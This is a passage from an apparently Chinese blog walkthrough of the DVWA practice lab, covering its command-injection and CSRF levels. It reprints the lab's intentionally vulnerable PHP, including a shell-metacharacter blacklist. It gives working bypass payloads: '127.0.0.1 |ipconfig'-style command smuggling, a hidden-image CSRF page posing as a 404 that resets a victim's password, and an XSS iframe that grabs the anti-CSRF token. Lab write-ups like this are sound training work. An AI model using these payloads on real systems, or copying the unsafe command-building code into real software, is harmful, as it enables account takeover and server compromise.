class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>  <span class="hljs-comment">// Windows</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// *nix</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br><br> <span class="hljs-comment">// Feedback for the end user</span><br> <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>相较于low来说添加了黑名单将&amp;&amp;和;做了限制进行了替换，换为空，但其他没限制仍然可以使用<code>127.0.0.1 &amp; ipconfig</code>进行绕过执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-10-51.png" alt="测试" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// Get input</span><br> <span class="hljs-variable">$target</span> = trim(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br> <span class="hljs-comment">// Set blacklist 添加了黑名单数量</span><br> <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>  <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br> );<br><br> <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br> <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Determine OS and execute the ping command.</span><br> <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>  <span class="hljs-comment">// Windows</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// *nix</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br><br> <span class="hljs-comment">// Feedback for the end user</span><br> <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>可以发现黑名单数量加多了，但仔细观察发现’| ‘管道符后边多了一个空格替换成空我们考虑使用管道符绕过<code>127.0.0.1 |ipconfig</code></p>
<p>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-18-33.png" alt="成功执行" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// Check Anti-CSRF token加入token验证</span><br> checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br> <span class="hljs-comment">// Get input 获取ip</span><br> <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br> <span class="hljs-comment">//stripslashes函数会剥离字符串中的反斜杠，然后返回剥离完反斜杠的字符串</span><br> <span class="hljs-variable">$target</span> = stripslashes( <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Split the IP into 4 octects 以.作为分隔符，分割$target</span><br> <span class="hljs-variable">$octet</span> = explode( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Check IF each octet is an integer检测分割后的元素是否都是数字类型</span><br> <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br>  <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.如果都是数字类型的话，就将2他们再合并成$torget</span><br>  <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>  <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>  <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>   <span class="hljs-comment">// Windows</span><br>   <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-comment">// *nix</span><br>   <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>  &#125;<br><br>  <span class="hljs-comment">// Feedback for the end user</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br> &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>这里是添加了白名单，白名单的作用是只允许什么通过。</p>
<h2 id="DVWA靶场通关-–-CSRF"><a href="#DVWA靶场通关-–-CSRF" class="headerlink" title="DVWA靶场通关 – CSRF"></a>DVWA靶场通关 – CSRF</h2><p>csrf(跨站请求伪造)，利用还未过期的用户信息诱骗用户点击链接修改用户信息<br>csrf主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-29-59.png" alt="csrf" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// Get input使用get方式获取两个密码</span><br> <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br> <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br> <span class="hljs-comment">// Do the passwords match?查看两次密码是否一样</span><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>  <span class="hljs-comment">// They do!一样的话直接插入数据库</span><br>  <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>  <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>  <span class="hljs-comment">// Update the database</span><br>  <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>  <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>  <span class="hljs-comment">// Feedback for the user</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Issue with passwords matching</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>get方式获取了两次输入的密码，一致的话直接将数据插入到数据库中<br>漏洞复现：<br>首先尝试修改密码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-14-31-38.png" alt="尝试登录" class="lazyload"><br>测试原来默认的密码登录失败，新设置的密码在url中可以看到<br>我们构造链接<a target="_blank" rel="noopener" href="http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a>在浏览器中访问发现密码就能被重新改回到password（诱骗用户点击）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-14-37-45.png" alt="执行" class="lazyload"><br>然后我们登录就可以使用password做密码登录了</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-comment">//stripos(str1,str2)检查str2在str1中出现的位置（不区分大小写）如果有//返回ture</span><br>    <span class="hljs-comment">//判断host字段是否出现在referer字段中</span><br>    <span class="hljs-keyword">if</span>( stripos( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// They do!</span><br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update the database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Didn&#x27;t come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>medium级别的代码检查了保留变量http_referer(http包头的referer参数值，表示来源地址)中是否包含了server_name（http包头的host参数，即要访问的主机名，这里是192.168.23.128），希望通过这种机制抵御csrf攻击<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-15-22-29.png" alt="抓包查看信息" class="lazyload"><br>可以看到数据包中有Referer但在url中没有，这里是url<a target="_blank" rel="noopener" href="http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a>可以进行查看参数中没有referer。意思是referer中只要出现server_name就可以正常操作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-10-52-59.png" alt="修改参数加入referer" class="lazyload"><br>可以看到在hackbr中修改参数密码为password然后添加头信心referer点击执行可以看到成功执行。<br>也可以自己搭建的恶意网站中是不存在这个的我们在链接中包含上服务器的地址就能绕过了，我们可以构造一个图片的src中包含服务器地址的文件，index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.23.128/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span><span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后存放到自己的网站然后发送链接<a target="_blank" rel="noopener" href="http://192.168.23.128/192.168.23.128.html">http://192.168.23.128/192.168.23.128.html</a>给用户一但点击攻击就完成了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-11-15-13.png" alt="成功执行" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token 加入了token检验机制</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>high级别的代码增加了token检验机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器提交token参数时服务器会在收到token时先检查token，token正确才会处理客户端请求。<br>漏洞复现：<br>这里可以利用存储型xss可执行代码获取token，其实是利用xss获取cooki中的token值，所以在这个地方我们使用xss执行。<br>现在存储型xss中写入语句<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code>有长度限制我们F12改限制<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-11-26-56.png" alt="存储型xss获取token" class="lazyload"><br>这里不要点击确定先复制，然后打开另一个网页打开csrf题输入修改的密码点击提交抓包，不放包发送到repeater中修改token的值点击go跟随查看响应可以看到密码修改了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-12-06-33.png" alt="操作" class="lazyload"><br>这种加token的方式由于是后台先把token发送到前端我们可以先获取到向应包中的token替换请求包中的token就能很容易绕过<br><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">//这里需要输入旧的密码进行校验</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_current&#x27;</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    <span class="hljs-variable">$pass_curr</span> = stripslashes( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_curr</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$pass_curr</span> = md5( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_curr</span>, PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;execute();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &amp;&amp; ( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        <span class="hljs-variable">$pass_new</span> = stripslashes( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) 